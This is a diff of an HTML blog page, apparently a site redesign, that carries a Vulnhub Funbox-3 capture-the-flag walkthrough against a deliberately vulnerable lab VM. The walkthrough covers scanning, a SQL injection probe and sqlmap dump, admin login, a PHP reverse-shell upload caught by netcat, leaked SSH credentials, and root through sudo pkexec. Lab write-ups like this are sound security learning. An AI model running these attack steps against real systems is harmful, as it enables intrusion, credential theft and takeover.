@@ -1,11 +1,59 @@
 <!DOCTYPE html>
-<html><head><script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mermaid/8.4.6/mermaid.min.js"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}});</script><script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/latest.js?config=TeX-MML-AM_CHTML"></script><link rel="stylesheet" href="static/default.min.css"><script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.4.0/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();</script><link rel="stylesheet" href="static/light.css"/></head><body>
-<a href="../boxesfolder.html" style="padding: 5px; color: black; position: absolute;">BACK</a><br>
-<img src="images/crazyeights.png" style="display: block; padding: 5px 0px; width: 50%; margin: auto; margin-top: 5px;">
-<h1>Vulnhub: Funbox-3</h1>
-<h6>Oct, 2020</h6>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>crazyeights225</title>
+   
+    <link rel="stylesheet" href="../assets/bulma.min.css">
+    <link rel="stylesheet" href="../static/default.min.css"><script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.4.0/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();</script>
+    <style>
+      span{margin: 0; line-height: 125%; white-space:pre-wrap;white-space:-moz-pre-wrap;white-space:-pre-wrap;white-space:-o-pre-wrap;word-wrap:break-word;}pre{padding:0.5rem 0.5rem!important;}
+    </style>
+  </head>
+  <body>
+    <div id="app" class="mt-2">
+        <nav class="navbar container" role="navigation" aria-label="main navigation">
+            <div class="navbar-brand">
+              <a class="navbar-item" href="/">
+                <img src="../assets/logo.png">
+              </a>
+              <a role="button" class="navbar-burger burger" aria-label="menu" aria-expanded="false" data-target="navbarBasicExample">
+                <span aria-hidden="true"></span>
+                <span aria-hidden="true"></span>
+                <span aria-hidden="true"></span>
+              </a>
+            </div>
+            <div id="navbar" class="navbar-menu">
+              <div class="navbar-start">
+                    <a href="../index.html" class="navbar-item">Posts</a>
+                    <a href="../projects.html" class="navbar-item">Projects</a>
+              </div>
+            </div>
+          </nav>
+    </div>
+    <div class="hero-body mt-2" style="background-color: #285aff;">
+        <div class="container has-text-centered">
+            <h1 class="title" style="color: #f1f1f1;">
+                Vulnhub: Funbox-3
+            </h1>
+            <h2 class="subtitle" style="color: #f1f1f1;">
+                Oct, 2020
+            </h2>
+        </div>
+    </div>
+</section>
+<section class="container mt-2">
+<div class="content column is-10">
+    <nav class="breadcrumb mb-5" aria-label="breadcrumbs">
+        <ul>
+          <li><a href="../index.html">Posts</a></li>
+          <li><a href="../sec.html">CTFs and Vulnerable VMs</a></li>
+          <li class="is-active"><a href="#" aria-current="page">Funbox-3</a></li>
+        </ul>
+      </nav>
 <h3>Scanning:</h3>
-<pre><code>crazyeights@es-base:~$ nmap -PS 192.168.56.1-255
+<pre><code><span>crazyeights@es-base:~$ nmap -PS 192.168.56.1-255
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-12 21:54 EDT
 
 Nmap scan report for 192.168.56.118
@@ -14,9 +62,9 @@ Not shown: 998 closed ports
 PORT   STATE SERVICE
 22/tcp open  ssh
 80/tcp open  http
-</code></pre>
+</span></code></pre>
 <h6>More Thorough Scanning:</h6>
-<pre><code>crazyeights@es-base:~$ nmap -A -p- 192.168.56.118
+<pre><code><span>crazyeights@es-base:~$ nmap -A -p- 192.168.56.118
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-12 21:55 EDT
 [SNIP]
 Not shown: 65532 closed ports
@@ -29,13 +77,13 @@ PORT      STATE SERVICE VERSION
 |_http-title: Apache2 Ubuntu Default Page: It works
 33060/tcp open  mysqlx?
 [SNIP]
-</code></pre>
+</span></code></pre>
 <h3>Web Enumeration:</h3>
 <ul>
 <li>index is apache2 default page</li>
 </ul>
 <h4>Scanning with dirb:</h4>
-<pre><code>crazyeights@es-base:~$ dirb http://192.168.56.118
+<pre><code><span>crazyeights@es-base:~$ dirb http://192.168.56.118
 [SNIP]
 GENERATED WORDS: 4612                                                          
 
@@ -59,12 +107,12 @@ GENERATED WORDS: 4612
 ---- Entering directory: http://192.168.56.118/store/ ----
 + http://192.168.56.118/store/admin.php (CODE:200|SIZE:3153)   
 [SNIP]
-</code></pre>
+</span></code></pre>
 <h5>Checking the secret directory:</h5>
-<pre><code>crazyeights@es-base:~$ curl http://192.168.56.118/secret/
+<pre><code><span>crazyeights@es-base:~$ curl http://192.168.56.118/secret/
 „Anyone who lives within their means suffers from a lack of imagination.“
 Oscar Wilde (*1854 - †1900)
-</code></pre>
+</span></code></pre>
 <ul>
 <li>there are several sites on the server a store, a gym page, and a project management site (?)</li>
 <li>Started with the book store because it looks like it has the most content (without having to login)</li>
@@ -85,10 +133,10 @@ Oscar Wilde (*1854 - †1900)
 </ul>
 <p><code>http://192.168.56.118/store/book.php?bookisbn=978-0-321-94786-4 or '1'='1</code></p>
 <p>Response is:</p>
-<pre><code>Can't retrieve data You have an error in your SQL syntax; 
-check the manual that corresponds to your MySQL server version for the right syntax to use near '1'='1'' at line 1</code></pre>
+<pre><code><span>Can't retrieve data You have an error in your SQL syntax; 
+check the manual that corresponds to your MySQL server version for the right syntax to use near '1'='1'' at line 1</span></code></pre>
 <h4>Using sqlmap to dump database:</h4>
-<pre><code>crazyeights@es-base:~$ sqlmap -u http://192.168.56.118/store/book.php?bookisbn=978-0-321-94786-4 --dump
+<pre><code><span>crazyeights@es-base:~$ sqlmap -u http://192.168.56.118/store/book.php?bookisbn=978-0-321-94786-4 --dump
 [SNIP]
 sqlmap identified the following injection point(s) with a total of 59 HTTP(s) requests:
 ---
@@ -110,9 +158,9 @@ Parameter: bookisbn (GET)
     Payload: bookisbn=-5080' UNION ALL SELECT NULL,NULL,CONCAT(0x71707a7871,0x59626b6e544b464b4c655250796a466c6e716b6f706f68696b7154676d6f485975546b7a656c7175,0x71767a7071),NULL,NULL,NULL,NULL-- -
 ---
 [SNIP]
-</code></pre>
+</span></code></pre>
 <h4>Cracking admin hash with sqlmap:</h4>
-<pre><code>Database: store                                                                                                    
+<pre><code><span>Database: store                                                                                                    
 Table: admin
 [1 entry]
 +-------+--------------------------------------------------+
@@ -120,7 +168,7 @@ Table: admin
 +-------+--------------------------------------------------+
 | admin | d033e22ae348aeb5660fc2140aec35850c4da997 (admin) |
 +-------+--------------------------------------------------+
-</code></pre>
+</span></code></pre>
 <h4>Logging in as admin:</h4>
 <ul>
 <li>at /store/admin.php with credentials admin:admin</li>
@@ -129,18 +177,18 @@ Table: admin
 <img src="images/fb3.png" style="width:90%">
 <li>images are stored:</li>
 </ul>
-<pre><code>http://192.168.56.118/store/bootstrap/img/
-</code></pre>
+<pre><code><span>http://192.168.56.118/store/bootstrap/img/
+</span></code></pre>
 <ul>
 <li>It would appear that the backend of this site doesn't actually do anything.</li>
 <li>It just takes a few minutes the file to upload for some reason</li>
 <li>Start netcat:</li>
-<pre><code>nc -lvp 1234
-</code></pre>
+<pre><code><span>nc -lvp 1234
+</span></code></pre>
 <li>Click on php-reverse-shell.php</li>
 <img src="images/fb4.png" style="width:90%">
 </ul>
-<pre><code>crazyeights@es-base:~$ nc -lvp 1234
+<pre><code><span>crazyeights@es-base:~$ nc -lvp 1234
 listening on [any] 1234 ...
 192.168.56.118: inverse host lookup failed: Unknown host
 connect to [192.168.56.1] from (UNKNOWN) [192.168.56.118] 55336
@@ -150,8 +198,8 @@ USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 /bin/sh: 0: can't access tty; job control turned off
 $ ls
-</code></pre>
-<pre><code>$ cd /home
+</span></code></pre>
+<pre><code><span>$ cd /home
 $ ls
 tony
 $ cd tony	
@@ -162,7 +210,7 @@ ssh: yxcvbnmYYY
 gym/admin: asdfghjklXXX
 /store: admin@admin.com admin
 $ 
-</code></pre>
+</span></code></pre>
 <ul>
 <li>the gym site actually did something, huh...</li>
 <li>The SSH password for tony is in the password file</li>
@@ -171,19 +219,19 @@ $
 <ul>
 <li>tony:yxcvbnmYYY</li>
 </ul>
-<pre><code>crazyeights@es-base:~$ ssh tony@192.168.56.118
+<pre><code><span>crazyeights@es-base:~$ ssh tony@192.168.56.118
 
 tony@192.168.56.118's password: 
 Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-42-generic x86_64)
 
 [SNIP]
 tony@funbox3:~$ 
-</code></pre>
+</span></code></pre>
 <h5>Checking html directory:</h5>
 <ul>
 <li>I have no idea what the rest of this is for:</li>
 </ul>
-<pre><code>tony@funbox3:~$ cd /var/www/html
+<pre><code><span>tony@funbox3:~$ cd /var/www/html
 tony@funbox3:/var/www/html$ ls
 admin                gym                     logout.php
 change-password.php  header.php              profile.php
@@ -193,9 +241,9 @@ dashboard.php        index.php               secret
 dbconnection.php     jquery-1.2.6.min.js     store
 forgot-password.php  jquery.timers-1.0.0.js  view-tickets.php
 get-quote.php        leftbar.php
-</code></pre>
+</span></code></pre>
 <h4>Priv Esc:</h4>
-<pre><code>tony@funbox3:/var/www/html$ sudo -l
+<pre><code><span>tony@funbox3:/var/www/html$ sudo -l
 Matching Defaults entries for tony on funbox3:
     env_reset, mail_badpass,
     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
@@ -212,20 +260,20 @@ User tony may run the following commands on funbox3:
     (root) NOPASSWD: /usr/bin/cancel
     (root) NOPASSWD:
         /root/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/q/r/s/t/u/v/w/x/y/z/.smile.sh
-</code></pre>
+</span></code></pre>
 <h5>Interesting:</h5>
-<pre><code> pkexec - Execute a command as another user
-</code></pre>
+<pre><code><span> pkexec - Execute a command as another user
+</span></code></pre>
 <h3>Testing it out:</h3>
-<pre><code>tony@funbox3:~$ sudo pkexec --user root /usr/bin/ls /root
+<pre><code><span>tony@funbox3:~$ sudo pkexec --user root /usr/bin/ls /root
 root.flag  snap
-</code></pre>
+</span></code></pre>
 <h5>Getting root:</h5>
-<pre><code>tony@funbox3:~$ sudo pkexec --user root /bin/bash -i
+<pre><code><span>tony@funbox3:~$ sudo pkexec --user root /bin/bash -i
 root@funbox3:~# 
-</code></pre>
+</span></code></pre>
 <h6>Getting the root flag:</h6>
-<pre><code>root@funbox3:~# cd /root
+<pre><code><span>root@funbox3:~# cd /root
 root@funbox3:~# ls
 root.flag  snap
 root@funbox3:~# cat root.flag 
@@ -238,9 +286,17 @@ root@funbox3:~# cat root.flag
                                                                         
 Made with ❤ from twitter@0815R2d2. Please, share this on twitter if you want.
 root@funbox3:~#
-</code></pre>
+</span></code></pre>
 <ul>
 <li>this one was awesome. just the right level of easy to you feel like a boss while doing it. 10/10</li>
 </ul>
 <p>FIN.</p>
-</body></html>
+</div>
+</section>
+<footer class="footer">
+    <div class="container">
+        <div class="columns">
+        </div>
+    </div>
+</footer>
+</body>
